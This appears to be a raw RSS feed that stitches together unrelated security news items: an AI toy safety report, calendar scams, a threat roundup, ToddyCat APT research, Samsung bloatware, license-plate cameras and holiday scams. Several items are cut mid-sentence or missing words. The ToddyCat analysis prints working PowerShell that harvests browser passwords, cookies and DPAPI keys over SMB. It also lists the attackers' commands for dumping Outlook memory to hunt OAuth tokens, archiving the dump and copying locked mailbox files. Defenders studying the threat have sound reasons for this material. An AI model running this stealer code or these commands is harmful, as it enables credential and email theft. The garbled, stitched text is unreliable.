It shows how easily artificial intelligence can cross serious boundaries. It’s a fair moment to ask whether AI-powered stuffed animals are appropriate for children.  It’s easy to get swept up in the excitement of artificial intelligence, especially when it’s packaged as a plush teddy bear promising “warmth, fun, and a little extra curiosity.” FoloToy, a Singapore-based toy company, marketed the $99 bear as the ultimate “friend for both kids and adults,” leveraging powerful conversational AI to deliver interactive stories and playful banter. The website described Kumma as intelligent and safe. Behind the scenes, the bear used OpenAI’s language model to generate its conversational responses. Unfortunately, reality didn’t match the sales pitch.According to a report from the US PIRG Education Fund, Kumma quickly veered into wildly inappropriate territory during researcher tests. Conversations escalated from innocent to sexual within minutes. The bear didn’t just respond to explicit prompts, which would have been more or less understandable. Researchers said it introduced graphic sexual concepts on its own, including BDSM-related topics, explained “knots for beginners,” and referenced roleplay scenarios involving children and adults.  In some conversations, Kumma also probed for personal details or offered advice involving dangerous objects in the home.It’s unclear whether the toy’s supposed safeguards against inappropriate content were missing or simply didn’t work. While children are unlikely to introduce BDSM as a topic to their teddy bear, the researchers warned just how low the bar was for Kumma to cross serious boundaries.The fallout was swift. FoloToy suspended sales of Kumma and other AI-enabled toys, while OpenAI revoked the developer’s access for policy violations. But as PIRG researchers note, that response was reactive. Plenty of AI toys remain unregulated, and the risks aren’t limited to one product.Which proves our point: AI does not automatically make something better. When companies rush out “smart” features without real safety checks, the risks fall on the people using them—especially children, who can’t recognize dangerous content when they see it.Tips for staying safe with AI toys and gadgetsYou’ll see “AI-powered” on almost everything right now, but there are ways to make safer choices. Check for third-party safety reviews before buying any AI-enabled product marketed for kids.Test first, supervise always: Interact with the device yourself before giving it to children. Monitor usage for odd or risky responses. If available, enable all content filters and privacy protections. If devices show inappropriate content, report to manufacturers and consumer protection groups. Find out what the device collects, who it shares data with, and what it uses the information for. But above all, remember that not all “smart” is safe. Sometimes, plush, simple, and old-fashioned really is better.AI may be everywhere, but designers and buyers alike need to put safety, privacy, and common sense ahead of the technological wow-factor.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline. With Malwarebytes Personal Data Remover, you can scan to find out which sites are exposing your personal information, and then delete that sensitive data from the internet.]]></content:encoded></item><item><title>Fake calendar invites are spreading.

The good news is you can remove them and block future spam by changing a few settings.Most of these unwanted calendar entries are there for phishing purposes. Most of them warn you about a “impending payment” but the difference is in the subject and the action they want the target to take.Sometimes they want you to call a number:And sometimes they invite you to an actual meeting:We haven’t followed up on these scams, but when attackers want you to call them or join a meeting, the end goal is almost always financial. They might use a tech support scam approach and ask you to install a Remote Monitoring and Management tool, sell you an overpriced product, or simply ask for your banking details.How to remove fake entries from your calendarThis blog focuses on how to remove these unwanted entries. One of the obstacles is that calendars often sync across devices.To disable automatic calendar additions:To prevent unknown senders from adding invites:Tap  >  > Add invitations to my calendar.Select Only if the sender is known.For help reviewing which apps have access to your Android Calendar, refer to the support page.To control how events get added to your Calendar on a Mac:Go to u >  > . Turn calendar access on or off for each app in the list.If you allow access, click  to choose whether the app has full access or can only add events.The controls are similar to macOS, but you may also want to remove additional calendars:Tap  >  > .Select any unwanted calendars and tap the  option.Which brings me to my next point. Check both the Outlook Calendar and the mobile Calendar app for  or  and Delete/Unsubscribe. This will stop the attacker from being able to add even more events to your Calendar. And looking in both places will be helpful in case of synchronization issues.Several victims reported that after removing an event, they just came back. This is almost always due to synchronization. Make sure you remove the unwanted calendar or event everywhere it exists.Tracking down the source can be tricky, but it may help prevent the next wave of calendar spam.How to prevent calendar spamWe’ve covered some of this already, but the main precautions are:Turn off auto‑add or auto‑processing so invites stay as emails until you accept them.Restrict calendar permissions so only trusted people and apps can add events.In shared or resource calendars, remove public or anonymous access and limit who can create or edit items.Use an up-to-date real-time anti-malware solution with a web protection component to block known malicious domains.Don’t engage with unsolicited events. Don’t click links, open attachments, or reply to suspicious calendar events such as “investment,” “invoice,” “bonus payout,” “urgent meeting”—just delete the event.If you’re not sure whether an event is a scam, you can feed the message to Malwarebytes Scam Guard. It’ll help you decide what to do next.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>The Good, the Bad and the Ugly in Cybersecurity – Week 47</title><link>https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-47-7/</link><author>SentinelOne</author><category>threatintel</category><enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/11/GBU_week47-1.jpg" length="" type=""/><pubDate>Fri, 21 Nov 2025 14:00:42 +0000</pubDate><source url="https://www.sentinelone.com/">SentinelOne Blog</source><content:encoded><![CDATA[The Good | Courts Prosecute DPRK Fraud, Ransomware Hosting & Crypto Mixer OpsFive people have pleaded guilty to helping the DPRK run illicit revenue schemes involving remote IT worker fraud and cryptocurrency theft. The group . The DOJ is also seeking forfeiture of $15 million tied to APT38 cyber-heists. The defendants, Oleksandr Didenko, Erick Prince, Audricus Phagnasay, Jason Salazar, and Alexander Travis, admitted to stealing U.S. identities for overseas workers and laundering stolen funds.In the U.S., U.K., and Australia,  to support malware delivery, phishing attacks, and illicit content hosting. To help cybercriminals evade capture, BPH services ignore abuse reports and law enforcement takedowns. OFAC has sanctioned Media Land, its sister companies, and three executives all tied to LockBit, BlackSuit, Play, and other threat groups. Five Eyes agencies also released guidance to help ISPs detect and block malicious infrastructure used by BPH services.The founders of . Operating since 2015, Samourai used its ‘Whirlpool’ mixing system and ‘Ricochet’ multi-hop transactions to obscure Bitcoin flows. These features made tracing more difficult and enabled criminals involved in darknet markets, drug trafficking, and cybercrime to launder more than $2 billion. Authorities seized the platform, including its servers, domains, and mobile app, while the founders agreed to forfeit all traceable proceeds. CEO Keonne Rodriguez has received five years, while CTO William Lonergan Hill received four along with supervised release. The pair were ordered to pay fines of $250,000 each.The Bad | DPRK Actors Build Fake Job Platform to Lure AI Talent & Push MalwareAs part of their ongoing and evolving Contagious Interview campaign, , particularly in the AI research, software development, and cryptocurrency verticals. While earlier fraudulent IT-worker schemes relied on targeting individuals through phishing on social media platforms, the latest tactic weaponizes a fully functional hiring pipeline.Researchers discovered the latest lure – a -based job portal hosted at , complete with dozens of fabricated AI and crypto-industry job listings. The listings mimic branding from major tech companies and feature a polished UI and full recruitment workflow that mirrors modern hiring systems, encouraging applicants to submit resumes and professional links before prompting them to record a video introduction.This final step triggers the DPRK-favored ClickFix technique: When applicants copy the fake interview instructions, a hidden clipboard hijacker swaps their text with a multi-stage malware command. When pasted into a terminal, it downloads and executes staged payloads under the guise of a “driver update”, ultimately launching a VBScript-based loader. This design blends seamlessly with typical remote-work interview processes and dramatically increases the likelihood of accidental execution.The platform also performs strategic filtering, attracting . The campaign reflects significant maturation in DPRK social engineering tradecraft, pairing high-fidelity UI design with covert malware delivery. Job seekers are advised to verify domains, avoid off-platform hiring systems, and execute any requested code only in sandboxed environments.The Ugly | Iran-Backed Actors Weaponize Cyber Recon to Power Real-World AttacksIranian-linked threat actors are using cyber operations to support real-world military activity, a pattern described by researchers as “cyber-enabled kinetic targeting”.In the past, conventional security models separated cyber and physical domains – delineations that are proving artificial in today’s socioeconomic and political climate. Now, these are .One example involves Crimson Sandstorm ( Tortoiseshell and TA456), a group tied to Iran’s Islamic Revolutionary Guard Corps (IRGC). Between December 2021 and January 2024, the group probed a ship’s Automatic Identification System (AIS) before expanding their operations to other maritime platforms. On January 27, 2024, the group searched for AIS location data on one particular shipping vessel. Days later, that same ship was targeted in an unsuccessful missile strike by Iranian-backed Houthi forces, which have mounted repeated missile attacks on commercial shipping in the Red Sea amid the Israel–Hamas conflict.A second case highlights Mango Sandstorm ( Seedworm and TA450), a group affiliated with Iran’s Ministry of Intelligence and Security (MOIS). In May, the group set up infrastructure for cyber operations and gained access to compromised CCTV feeds in Jerusalem to gather real-time visual intelligence. Just a month later, the Israel National Cyber Directorate confirmed Iranian attempts to access cameras during large-scale attacks, reportedly to get feedback on where the missiles hit and improve precision. Both highlighted cases show the attackers’ reliance on routing traffic through anonymizing VPNs to prevent attribution.The divide between digital intrusions and physical warfare continues to blur.

It can be set up either using on-premises infrastructure (for example, by deploying Microsoft Exchange Server) or through cloud mail services such as Microsoft 365 or Gmail.At first glance, it might seem that using cloud services offers a higher level of confidentiality for corporate correspondence: mail data remains external, even if the organization’s internal infrastructure is compromised. However, this does not stop highly organized espionage groups like the ToddyCat APT group.This research describes how ToddyCat APT evolved its methods to gain covert access to the business correspondence of employees at target companies. In the first part, we review the incidents that occurred in the second half of 2024 and early 2025. In the second part of the report, we focus in detail on how the attackers implemented a new attack vector as a result of their efforts. This attack enables the adversary to leverage the user’s browser to obtain OAuth 2.0 authorization tokens. These tokens can then be utilized outside the perimeter of the compromised infrastructure to access corporate email.In a previous post on the ToddyCat group, we described the TomBerBil family of tools, which are designed to extract cookies and saved passwords from browsers on user hosts. These tools were written in C# and C++.Yet, analysis of incidents from May to June 2024 revealed a new variant implemented in PowerShell. It retained the core malicious functionality of the previous samples but employed a different implementation approach and incorporated new commands.A key feature of this version is that it was executed on domain controllers on behalf of a privileged user, accessing browser files via shared network resources using the SMB protocol.Besides supporting the Chrome and Edge browsers, the new version also added processing for Firefox browser files.The tool was launched using a scheduled task that executed the following command line:powershell -exec bypass -command "c:\programdata\ip445.ps1"
The script begins by creating a new local directory, which is specified in the  variable. The tool saves all data it collects into this directory.$baseDir = 'c:\programdata\temp\'

try{
	New-Item -ItemType directory -Path $baseDir | Out-Null
}catch{
	
}
The script defines a function named , which accepts the full file path as a parameter. It opens the C:\programdata\uhosts.txt file and reads its content line by line using .NET Framework classes, returning the result as a string array. This is how the script forms an array of host names.function parseFile{
    param(
        [string]$fileName
    )
    
    $fileReader=[System.IO.File]::OpenText($fileName)

    while(($line = $fileReader.ReadLine()) -ne $null){
        try{
            $line.trim()
            }
        catch{
        }
    }
    $fileReader.close()
}
For each host in the array, the script attempts to establish an SMB connection to the shared resource , constructing the path in the  format. If the connection is successful, the tool retrieves a list of user directories present on the remote host. If at least one directory is found, a separate folder is created for that host within the  working directory:foreach($myhost in parseFile('c:\programdata\uhosts.txt')){
    $myhost=$myhost.TrimEnd()
    $open=$false
    
    $cpath = "\\{0}\c$\users\" -f $myhost
    $items = @(get-childitem $cpath -Force -ErrorAction SilentlyContinue)
	
	$lpath = $baseDir + $myhost
	try{
		New-Item -ItemType directory -Path $lpath | Out-Null
	}catch{
		
	}
In the next stage, the script iterates through the user folders discovered on the remote host, skipping any folders specified in the  variable, which is defined upon launching the tool. For the remaining folders, three directories are created in the script’s working folder for collecting data from Google Chrome, Mozilla Firefox, and Microsoft Edge.$filter_users = @('public','all users','default','default user','desktop.ini','.net v4.5','.net v4.5 classic')

foreach($item in $items){
	
	$username = $item.Name
	if($filter_users -contains $username.tolower()){
		continue
	}
	$upath = $lpath + '\' + $username
	
	try{
		New-Item -ItemType directory -Path $upath | Out-Null
		New-Item -ItemType directory -Path ($upath + '\google') | Out-Null
		New-Item -ItemType directory -Path ($upath + '\firefox') | Out-Null
		New-Item -ItemType directory -Path ($upath + '\edge') | Out-Null
	}catch{
		
	}
Next, the tool uses the default account to search for the following Chrome and Edge browser files on the remote host:: a database file that contains the user’s saved logins and passwords for websites in an encrypted format: a JSON file containing the encryption key used to encrypt stored data: a database file that stores HTTP cookies for all websites visited by the user: a database that stores the browser’s historyThese files are copied via SMB to the local folder within the corresponding user and browser folder hierarchy. Below is a code snippet that copies the Login Data file:$googlepath = $upath + '\google\'
$firefoxpath = $upath + '\firefox\'
$edgepath = $upath + '\edge\'
$loginDataPath = $item.FullName + "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
if(test-path -path $loginDataPath){
	$dstFileName = "{0}\{1}" -f $googlepath,'Login Data'
	copy-item -Force -Path $loginDataPath -Destination $dstFileName | Out-Null
}
The same procedure is applied to Firefox files, with the tool additionally traversing through all the user profile folders of the browser. Instead of the files described above for Chrome and Edge, the script searches for files which have names from the  array that contain similar information. The requested files are also copied to the tool’s local folder.$firefox_files = @('key3.db','signons.sqlite','key4.db','logins.json')

$firefoxBase = $item.FullName + '\AppData\Roaming\Mozilla\Firefox\Profiles'
if(test-path -path $firefoxBase){
	$profiles = @(get-childitem $firefoxBase -Force -ErrorAction SilentlyContinue)
	foreach($profile in $profiles){
		if(!(test-path -path ($firefoxpath + '\' + $profile.Name))){
			New-Item -ItemType directory -Path ($firefoxpath + '\' + $profile.Name) | Out-Null
		}
		foreach($firefox_file in $firefox_files){
			$tmpPath = $firefoxBase + '\' + $profile.Name + '\' + $firefox_file
			if(test-path -Path $tmpPath){
				$dstFileName = "{0}\{1}\{2}" -f $firefoxpath,$profile.Name,$firefox_file
				copy-item -Force -Path $tmpPath -Destination $dstFileName | Out-Null
			}
		}
	}
}
The copied files are encrypted using the Data Protection API (DPAPI). The previous version of TomBerBil ran on the host and copied the user’s token. As a result, in the user’s current session DPAPI was used to decrypt the master key, and subsequently, the files. The updated server-side version of TomBerBil copies files containing the user encryption keys that are used by DPAPI. These keys, combined with the user’s SID and password, grant the attackers the ability to decrypt all the copied files locally.if(test-path -path ($item.FullName + '\AppData\Roaming\Microsoft\Protect')){
	copy-item -Recurse -Force -Path ($item.FullName + '\AppData\Roaming\Microsoft\Protect') -Destination ($upath + '\') | Out-Null
}
if(test-path -path ($item.FullName + '\AppData\Local\Microsoft\Credentials')){
	copy-item -Recurse -Force -Path ($item.FullName + '\AppData\Local\Microsoft\Credentials') -Destination ($upath + '\') | Out-Null
}
With TomBerBil, the attackers automatically collected user cookies, browsing history, and saved passwords, while simultaneously copying the encryption keys needed to decrypt the browser files. The connection to the victim’s remote hosts was established via the SMB protocol, which significantly complicated the detection of the tool’s activity.As a rule, such tools are deployed at later stages, after the adversary has established persistence within the organization’s internal infrastructure and obtained privileged access.To detect the implementation of this attack, it’s necessary to set up auditing for access to browser folders and to monitor network protocol connection attempts to those folders.title: Access To Sensitive Browser Files Via Smb

level: mediumStealing emails from OutlookThe modified TomBerBil tool family proved ineffective at evading monitoring tools, compelling the threat actor to seek alternative methods for accessing the organization’s critical data. We discovered an attempt to gain access to corporate correspondence files in the local Outlook storage.The Outlook application stores OST (Offline Storage Table) files for offline use. The names of these files contain the address of the mailbox being cached. Outlook uses OST files to store a local copy of data synchronized with mail servers: Microsoft Exchange, Microsoft 365, or Outlook.com. This capability allows users to work with emails, calendars, contacts, and other data offline, then synchronize changes with the server once the connection is restored.However, access to an OST file is blocked by the application while Outlook is running. To copy the file, the attackers created a specialized tool called TCSectorCopy.This tool is designed for block-by-block copying of files that may be inaccessible by applications or the operating system, such as files that are locked while in use.The tool is a 32-bit PE file written in C++. After launch, it processes parameters passed via the command line: the path to the source file to be copied and the path where the result should be saved. The tool then validates that the source path is not identical to the destination path.Validating the TCSectorCopy command line parametersNext, the tool gathers information about the disk hosting the file to be copied: it determines the cluster size, file system type, and other parameters necessary for low-level reading.Determining the disk’s file system typeTCSectorCopy then opens the disk as a device in read-only mode and sequentially copies the file content block by block, bypassing the standard Windows API. This allows the tool to copy even the files that are locked by the system or other applications.The adversary uploaded this tool to target host and used it to copy user OST files:xCopy.exe  C:\Users\<user>\AppData\Local\Microsoft\Outlook\<email>@<domain>.ost <email>@<domain>.ost2
Having obtained the OST files, the attackers processed them using a separate tool to extract the email correspondence content.XstReader is an open-source C# tool for viewing and exporting the content of Microsoft Outlook OST and PST files. The attackers used XstReader to export the content of the previously copied OST files.XstReader is executed with the  parameter and the path to the copied file. The  parameter specifies the export of all messages and their attachments to the current folder in the HTML, RTF, and TXT formats.XstExport.exe -e <email>@<domain>.ost2
After exporting the data from the OST file, the attackers review the list of obtained files, collect those of interest into an archive, and exfiltrate it.Stealing data with TCSectorCopy and XstReaderTo detect unauthorized access to Outlook OST files, it’s necessary to set up auditing for the %LOCALAPPDATA%\Microsoft\Outlook\ folder and monitor access events for files with the  extension. The Outlook process and other processes legitimately using this file must be excluded from the audit.title: Access To Outlook Ost Files

The TCSectorCopy tool accesses the OST file via the disk device, so to detect it, it’s important to monitor events such as Event ID 9 (RawAccessRead) in Sysmon. These events indicate reading directly from the disk, bypassing the file system.As we mentioned earlier, TCSectorCopy receives the path to the OST file via a command line. Consequently, detecting this tool’s malicious activity requires monitoring for a specific OST file naming pattern: the  symbol and the  extension in the file name.Example of detecting TCSectorCopy activity in KATAStealing access tokens from OutlookSince active file collection actions on a host are easily tracked using monitoring systems, the attackers’ next step was gaining access to email outside the hosts where monitoring was being performed. Some target organizations used the Microsoft 365 cloud office suite. The attackers attempted to obtain the access token that resides in the memory of processes utilizing this cloud service.In the OAuth 2.0 protocol, which Microsoft 365 uses for authorization, the access token is used when requesting resources from the server. In Outlook, it is specified in API requests to the cloud service to retrieve emails along with attachments. Its disadvantage is its relatively short lifespan; however, this can be enough to retrieve all emails from a mailbox while bypassing monitoring tools.The access token is stored using the JWT (JSON Web Tokens) standard. The token content is encoded using Base64. JWT headers for Microsoft applications always specify the  parameter with the  value first. This means that the first 18 characters of the encoded token will always be the same.The attackers used SharpTokenFinder to obtain the access token from the user’s Outlook application. This tool is written in C# and designed to search for an access token in processes associated with the Microsoft 365 suite. After launch, the tool searches the system for the following processes:If these processes are found, the tool attempts to open each process’s object using the  function and dump their memory. To do this, the tool imports the MiniDumpWriteDump function from the  file, which writes user mode minidump information to the specified file. The dump files are saved in the  folder, located in the current SharpTokenFinder directory. After creating dump files for the processes, the tool searches for the following string pattern in each of them:"eyJ0eX[a-zA-Z0-9\\._\\-]+"
This template uses the first six symbols of the encoded JWT token, which are always the same. Its structures are separated by dots. This is sufficient to find the necessary string in the process memory dump.In the incident being described, the local security tools (EPP) blocked the attempt to create the  process dump using SharpTokenFinder, so the operator used ProcDump from the Sysinternals suite for this purpose:procdump64.exe -accepteula -ma OUTLOOK.exe
dir c:\windows\temp\OUTLOOK.EXE_<id>.dmp
c:\progra~1\winrar\rar.exe a -k -r -s -m5 -v100M %temp%\dmp.rar c:\windows\temp\OUTLOOK.EXE_<id>.dmp
Here, the operator executed ProcDump with the following parameters: silently accepts the license agreement without displaying the agreement window. indicates that a full process dump should be created. is the name of the process to be dumped.The  command is then executed as a check to confirm that the file was created and is not zero size. Following this validation, the file is added to a  archive using WinRAR. The attackers sent this file to their host via SMB.To detect this technique, it’s necessary to monitor the ProcDump process command line for names belonging to Microsoft 365 application processes.title: Dump Of Office 365 Processes Using Procdump

The software was, it said,This all harks back to May, when digital rights group SMEX published an open letter to Samsung. It accused the company of installing AppCloud on its Galaxy A and M series devices, although stopped short of calling it spyware, opting for the slightly more diplomatic “bloatware”.The application, apparently installed on phones in West Asia and North Africa, did more than just take up storage space, though.According to SMEX, it collected sensitive information, including biometric data and IP addresses.SMEX’s analysis says the software, developed by Israeli company ironSource, is deeply integrated into the device’s operating system. You need root access to remove it, and doing so voids the warranty.Samsung has partnered with ironSource since 2022, carrying the its Aura toolkit for telecoms companies and device maker in more than 30 markets, including Europe. The pair expanded the partnership in November 2022—the same month that US company Unity Technologies (that makes the Unity game engine) completed its $4.4bn acquisition of ironSource. That expansion made ironSource “Samsung’s sole partner on newly released A-series and M-series mobile devices in over 50 markets across MENA – strengthening Aura’s footprint in the region.”SMEX’s investigation of ironSource’s products points to software called Install Core. It cites our own research of this software, which is touted as an advertising technology platform, but can install other products without the user’s permission.AppCloud wasn’t listed on the Unity/Ironsource website this February when SMEX wrote its in-depth analysis. It still isn’t. It also doesn’t appear on the phone’s home screen. It runs quietly in the background, meaning there’s no privacy policy to read and no consent screen to click, says SMEX.Screenshots shared online suggest AppCloud can access network connections, download files at will, and prevent phones from sleeping. However, this does highlight one important aspect of this software: While you might not be able to start it from your home screen or easily remove it, you can disable it in your application list. Be warned, though; it has a habit of popping up again after system updates, say users.Not Samsung’s first privacy controversyThis isn’t Samsung’s first controversy around user privacy. Back in 2015, it was criticized for warning users that some smart TVs could listen to conversations and share them with third parties.Neither is it the first time that budget phone users have had to endure pre-installed software that they might not have wanted. In 2020, we reported on malware that was pre-installed on budget phones made available via the US Lifeline program.In fact, there have been many cases of pre-installed software on phones that are identifiable as either malware or potentially unwanted programs. In 2019, Maddie Stone, a security researcher for Google’s Project Zero, explained how this software makes its way onto phones before they reach the shelves. Sometimes, phone vendors will put malware onto their devices after being told that it’s legitimate software, she warned. This can result in botnets like Chamois, which was built on pre-installed malware purporting to be from an SDK.One answer to this problem is to buy a higher-end phone, but you shouldn’t have to pay more to get basic privacy. Budget users should expect the same level of privacy as anyone else. We wrote a guide to removing bloatware— it’s from 2017, but the advice is still relevant. We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Oracle Identity Manager Exploit Observation from September (CVE-2025-61757), (Thu, Nov 20th)</title><link>https://isc.sans.edu/diary/rss/32506</link><author></author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 16:51:46 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[Searchlight Cyber today released a blog detailing CVE-2025-61757, a vulnerability they reported to Oracle.

As you turn onto your street, something new catches your eye. It’s a tall pole with a small, boxy device perched on top. But it’s not a bird-house and there’s no sign. There is, however, a camera pointed straight at your car. It feels reassuring at first. After all, a neighbor was burglarized a few weeks ago. But then, dropping your kids at school the next morning, you pass another, and you start to wonder: Is my daily life being recorded and who is watching it?That’s what happened to me. After a break-in on our street, a neighborhood camera caught an unfamiliar truck. It provided the clue police needed to track down the suspects. The same technology has shown up in major investigations, including the “Coroner Affair” murder case on ABC’s 20/20. These cameras aren’t just passive hardware. They’re everywhere now, as common as mailboxes, quietly logging where we go.So if they’re everywhere, what do they collect? Who’s behind them? And what should the rest of us know before we get too comfortable or too uneasy?A mounting mountain of surveillanceALPRs aren’t hikers in the Alps. They’re Automatic License Plate Readers. Think of them as smart cameras that can “read” license plates. They snap a photo, use software to convert the plate into text, and store it. Kind of like how your phone scans handwriting and turns it into digital notes.People like them because they make things quick and hands-free, whether you’re rolling through a toll or entering a gated neighborhood. But the “A” in ALPR (automatic) is where the privacy questions start. These cameras don’t just record problem cars. They record  car they see, wherever they’re pointed.Flock Safety is a company that makes specialized ALPR systems, designed to scan and photograph every plate that passes, 24/7. Unlike gated-community or private driveway cameras, Flock systems stream footage to off-site servers, where it’s processed, analyzed, and added to a growing cloud database.At the time of writing,  there are probably well over 100,000 Flock cameras installed in the United States and increasingly rapidly. To put this in perspective, that’s one Flock camera for every 4,000 US citizens. And each camera tracks twice as many vehicles on average with no set limit.Think of it like a digital neighborhood watch that never blinks. The cameras snap high-resolution images, tag timestamps, and note vehicle details like color and distinguishing features. All of it becomes part of a searchable log for authorized users, and that log grows by the second.Adoption has exploded. Flock said in early 2024 that its cameras were used in more than 4,000 US cities. That growth has been driven by word of mouth (“our HOA said break-ins dropped after installing them”) and, in some cases, early-adopter discounts offered to communities.Credit where it’s due: these cameras can help. For many neighborhoods, Flock cameras make them feel safer. When crime ticks up or a break-in happens nearby, putting a camera at the entrance feels like a concrete way to regain control. And unlike basic security cameras, Flock systems can flag unfamiliar vehicles and spot patterns, which are useful for police when every second counts.In my community, Flock footage has helped recover stolen cars and given police leads that would’ve otherwise gone cold. After our neighborhood burglary, the moms’ group chat calmed down a little knowing there was a digital “witness” watching the entrance.In one Texas community, a spree of car break-ins stopped after a Flock camera caught a repeat offender’s plate, leading to an arrest within days. And in the “Coroner Affair” murder case, Flock data helped investigators map vehicle movements, leading to crucial evidence.Regulated surveillance can also help fight fake videos. Skilled AI and CGI artists sometimes create fake surveillance footage that looks real, showing someone or their car doing something illegal or being somewhere suspicious. That’s a serious problem, especially if used in court. If surveillance is carefully managed and trusted, it can help prove what really happened and expose fabricated videos for what they are, protecting people from false accusations.The security vs overreach tradeoffLike any powerful tool, ALPRs come with pros and cons. On the plus side, they can help solve crimes by giving police crucial evidence—something that genuinely reassures residents who like having an extra set of “digital eyes” on the neighborhood. Some people also believe the cameras deter would-be burglars, though research on that is mixed.But there are real concerns too. ALPRs collect sensitive data, often stored by third-party companies, which creates risk if that information is misused or hacked. And then there’s “surveillance creep,” which is the slow expansion of monitoring until it feels like everyone is being watched all the time.So while there are clear benefits, it’s important to think about how the technology could affect your privacy and the community as a whole.What’s being recorded and who gets to see itHere’s the other side of the coin: What else do these cameras capture, who can see it, and how long is it kept?Flock’s system is laser-focused on license plates and cars, not faces. The company says they don’t track what you’re wearing or who’s sitting beside you. Still, in a world where privacy feels more fragile every year, people (myself included) wonder how much these systems quietly log. License plate numbers, vehicle color/make/model, time, location. Some cameras can capture broader footage; some are strictly plate readers. Flock’s standard is 30 days, after which data is automatically deleted (unless flagged in an active investigation). This is where things get dicey:
Using Flock’s cloud, only “authorized users”, which can include community leaders and law enforcement, ideally with proper permissions or warrants, can view footage. Residents can make requests for someone to determine privileges.Flock claims they don’t sell data, but it’s stored off-site, raising the stakes of a breach. The bigger the database, the more appealing it is to attackers.Unlike a home security camera that you can control, these systems by design track everyone who comes and goes…not just the “bad guys.”And while these cameras don’t capture people, they do capture patterns, like vehicles entering or leaving a neighborhood. That can reveal routines, habits, and movement over time. A neighbor was surprised to learn it had logged every one of her daily trips, including gym runs, carpool, and errands. Not harmful on its own, but enough to make you realize how detailed a picture these systems build of ordinary life.The place for ALPRs… and where they don’t belongIf you’re feeling unsettled, you’re not alone. ALPRs are being installed at lightspeed, often faster than the laws meant to govern them. Will massive investment shape how future rules are written?Surveillance and data collection laws There’s no nationwide ban on license plate readers; law enforcement has used them for years. (We’ve also reported on police using drones to read license plates, raising similar concerns about oversight.) However, courts in the US increasingly grapple with how this data impacts Fourth Amendment “reasonable expectation of privacy” standards. Some states and cities have rules about where cameras can be placed on public and private roadways. They have also ordained how long footage can be kept. Check your local ordinances or ask your community for policy.A good example is Oakland, where the City Council limited ALPR data retention to six months unless tied to an active investigation. Only certain authorized personnel can access the footage, every lookup is logged and auditable, and the city must publish annual transparency reports showing usage, access, and data-sharing. The policy also bans tracking anyone based on race, religion, or political views. It’s a practical attempt to balance public safety with privacy rights.Are your neighbors allowed to record your car?If your neighborhood is private property, usually yes. HOAs and community boards can install cameras at entrances and exits, much like a private parking lot. They still have to follow state law and, ideally, notify residents, so always read the fine print in those community updates.What if the footage is misused or hacked?This is the big one. If footage leaves your neighborhood, such as handed to police, shared too widely, or leaked online, it can create liability issues. Flock says its system is encrypted and tightly controlled, but no technology is foolproof. If you think footage was misused, you can request an audit or raise it with your HOA or local law enforcement.One thing stands out in this debate: the strongest supporters of ALPRs are the groups that use or sell them, i.e. law enforcement and the companies that profit from the technology. It is difficult to find community organizations or privacy watchdogs speaking up in support. Instead, many everyday people and civil liberties groups are raising concerns. It’s worth asking why the push for ALPRs comes primarily from those who benefit directly, rather than from the wider public who are most affected by increased surveillance.As neighborhood ALPRs like Flock cameras become more common, a growing set of advocacy and educational sites has stepped in to help people understand the technology, and to push back when needed:Deflock.me is one of the most active. It helps residents opt their vehicles out where possible, track Flock deployments, and organize local resistance to unwanted surveillance.Meanwhile, Have I Been Flocked?takes an almost playful approach to a very real issue: it lets people check whether their car has appeared in Flock databases. That simple search often surprises users and highlights how easily ordinary vehicles are tracked.For folks seeking a deeper dive, Eyes on Flock and ALPR Watch map where Flock cameras and other ALPRs have been installed, providing detailed databases and reports. By shining a light on their proliferation, the sites empower residents to ask municipal leaders hard questions about the balance between public safety and civil liberties.If you want to see the broader sweep of surveillance tech in the US, the Atlas of Surveillance is a collaboration between the Electronic Frontier Foundation (EFF) and University of Nevada, Reno. It offers an interactive map of surveillance systems, showing ALPRs like Flock in context of a growing web of automated observation.Finally, Plate Privacy provides practical tools: advocacy guides, legal resources, and tips for shielding plates from unwanted scanning. It supports anyone who wants to protect the right to move through public space without constant tracking.Together, these initiatives paint a clear picture: while ALPRs spread rapidly in the name of safety, an equally strong movement is demanding transparency, limits, and respect for privacy. Whether you’re curious, cautious, or concerned, these sites offer practical help and a reminder that you’re not alone in questioning how much surveillance is too much.How to protect your privacy around ALPRsThis is where I step out of the weeds and offer real-world advice… one neighbor to another.Talk to your neighborhood or city board Who can access footage? How long is it stored? What counts as a “valid” reason to review it? Push for clear, written policies that everyone can see. Even if your state doesn’t require one, your community may still offer an option.Key questions to ask about any new camera systemWho will have access to the footage?How long will data be stored?What’s the process for police, or anyone else, to request footage?What safeguards are in place if the data is lost, shared, or misused?Protecting your own privacyCheck your community’s camera policies regularly. Homeowners Associations (HOAs) update them more often than you’d think.Consider privacy screens or physical barriers if a camera directly faces your home.Stay updated on your state’s surveillance laws. Rules around data retention and access can change.You don’t have to choose between feeling safe and feeling free. With the right policies and a bit of open conversation communities can use technology without giving up privacy. The goal isn’t to pit safety against rights, but to make sure both can coexist.What’s your take? Have ALPRs made you feel safer, more anxious, or a bit of both? Share your thoughts in the comments, and let’s keep the conversation welcoming, practical, and focused on building communities we’re proud to live in.

We compare prices on the go, download apps for coupons, and jump on deals before they disappear. But during deal-heavy periods like Black Friday, Cyber Monday, and the December shopping rush, convenience can work against us.Quick check-outs, unknown websites, and ads promising unbeatable prices make shoppers easy targets.Shopping scams can steal money or data, but they also steal peace of mind. Victims often describe a mix of frustration, embarrassment, and anger that lasts for a long time. And during the holidays when you’re already stretched thin, the financial and emotional fallout lands harder, spoiling plans, straining trust, and adding anxiety to what should be a joyful and restful time.The data for deals exchangeDuring the holidays, deal-chasing behavior spikes. Nearly 9 in 10 mobile consumers hand over emails or phone numbers in the name of savings—often without realizing how much personal data they’re sharing.79% sign up for promotional emails to get offers.66% download an app for a coupon, discount, or free trial.58% give their phone number for texts to get a deal.This constant “data for deals” exchange normalizes risky habits that scammers can easily exploit through fake promotions and reward campaigns.The Walmart gift card scamThe scammers aren’t actually offering a free gift card. It’s a data-harvesting trap. Each form you fill out collects your name, email, phone number, ZIP code, and interests, all used to build a detailed profile that’s resold to advertisers or used for more scams down the line.These so-called “holiday reward” scams pop up every year, promising gift cards, coupons, or cash-back bonuses, and they work because they play on the 